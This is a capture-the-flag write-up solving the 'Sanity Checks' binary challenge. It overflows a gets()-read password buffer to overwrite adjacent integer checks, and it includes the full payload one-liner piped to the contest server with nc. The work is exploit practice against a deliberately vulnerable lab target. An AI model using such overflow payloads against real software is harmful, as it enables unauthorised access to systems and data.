## Sanity Checks

### Challenge Description

I made a program (source) to protect my flag. On the off chance someone does get in, I added some sanity checks to detect if something fishy is going on. See if you can hack me at `/problems/2021/sanity_checks` on the shell server, or connect with `nc shell.actf.co 21303`.  

Hint: `gdb` may be helpful for analyzing how data is laid out in memory.  

### Writeup

We are given an executable file and its code and a server address. We have four variables defined in code:  
```python
char password[64];
int ways_to_leave_your_lover = 0;
int what_i_cant_drive = 0;
int when_im_walking_out_on_center_circle = 0;
int which_highway_to_take_my_telephones_to = 0;
int when_i_learned_the_truth = 0;
```
Then we have a `gets` function which gets value for `password` variable. If the password variable is equal to `password123` then we can proceed. We have some if conditions thaa check value of 5 integer variables.  
```python
if(strcmp(password, "password123") == 0){
        puts("Logged in! Let's just do some quick checks to make sure everything's in order...");
        if (ways_to_leave_your_lover == 50) {
            if (what_i_cant_drive == 55) {
                if (when_im_walking_out_on_center_circle == 245) {
                    if (which_highway_to_take_my_telephones_to == 61) {
                        if (when_i_learned_the_truth == 17) {
                            char flag[128];
                            FILE *f = fopen("flag.txt","r");
                            if (!f) {
                                printf("Missing flag.txt. Contact an admin if you see this on remote.");
                                exit(1);
                            }
                            fgets(flag, 128, f);
                            printf(flag);
                            return;
                        }
                    }
                }
            }
        }
```
So we see that we have to give password in a way that contains `password123` and then some charachters that fills the gap between `password` array and integer variables. And finaly some bytes that can change integer values in a way that `if conditions` satisfy.  
First we have to put `password123\x00` to authorize password. Then we should have some charachters to fill the gap. And then we used the result of code bellow to initialize that integers.  
```python
import pwn
pwn.p32(17) + pwn.p32(61) + pwn.p32(245) + pwn.p32(55) + pwn.p32(50)
```
We need 64 byte to fill gaps. Finally we can get the flag using command bellow:  
```
python2.7 -c "print 'password123\x00' + 'A'*64 + '\x11\x00\x00\x00=\x00\x00\x00\xf5\x00\x00\x007\x00\x00\x002\x00\x00\x00'" | nc shell.actf.co 21303
```
Here is the flag:  
![flag.png](https://github.com/aahsani/CTFWriteups/blob/master/%C3%A5ngstromCTF2021/Binary/SanityChecks/flag.png)